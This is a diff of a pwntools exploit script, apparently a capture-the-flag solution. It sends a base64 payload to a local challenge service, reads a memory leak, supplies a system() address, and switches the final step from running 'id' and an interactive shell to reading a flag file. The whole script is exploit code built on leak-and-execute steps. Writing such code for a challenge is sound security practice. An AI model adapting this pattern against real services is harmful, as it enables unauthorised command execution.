@@ -1,6 +1,6 @@
 from pwn import *
 import base64
-file_to_encrypt = b"./en"
+file_to_encrypt = b"test"
 file_to_store = b"./out"
 
 payload = b"\x00"
@@ -16,14 +16,20 @@ payload += b"\x00"
 
 #p = process("./wrapper")
 p = remote("localhost",1337);
-#p.sendlineafter("bytes): \n",str(len(payload)))
-p.sendlineafter("file: ",base64.b64encode(payload))
+
+print(p.sendlineafter("bin file: ",base64.b64encode(payload)))
+
+file_to_encrypt = p.recvline().split(b" ")[-1].replace(b'\n',b'')
+print(file_to_encrypt)
+print(p.sendlineafter("file to encrypt: ",base64.b64encode(b"test")))
+#file_to_store = p.recvline().split(b" ")[-1]
+
 
 p.sendlineafter("encrypt\n",file_to_encrypt)
 
 p.sendlineafter("result: ",file_to_store)
-#p.interactive()
-#p.recvline()
+
+
 leak = p.recv(1000)
 
 
@@ -50,6 +56,8 @@ p.sendline(str(system))
 #payload += p64(ret)
 #payload += p64(system)
 
-p.sendline("id")
-p.interactive()
+
+p.sendline(b"cat we_kind_thought_leaking_this_was_gonna_be_another_chall_flag.txt")
+print(p.recv(420).replace(b'\n',b''))
+#p.interactive()
 
